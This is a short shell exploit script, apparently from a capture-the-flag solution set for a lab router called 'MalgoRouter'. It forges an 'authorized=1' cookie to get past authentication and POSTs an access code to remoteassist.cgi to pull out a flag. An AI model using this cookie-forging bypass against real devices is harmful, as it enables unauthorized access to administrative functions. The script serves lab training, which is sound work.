#!/bin/sh
# M17 - remoteassist.cgi runs /usr/sbin/magicd with the supplied access code
# (gated only by the M6 authorized=1 bypass). magicd prints the lab flag when the
# code matches its obfuscated literal (base) or the MAC-derived code (l2).
: "${TARGET:?set TARGET to the MalgoRouter IP}"
CODE="${1:-test}"
echo "[*] POST remoteassist.cgi code=$CODE with authorized=1 bypass"
curl -s --max-time 15 -X POST -H 'Cookie: authorized=1' \
     --data-urlencode "code=$CODE" "http://$TARGET/cgi-bin/remoteassist.cgi" \
     | grep -Eo 'DEBUG MODE ENABLED[^<]*|service running|flag\{[^}]*\}'
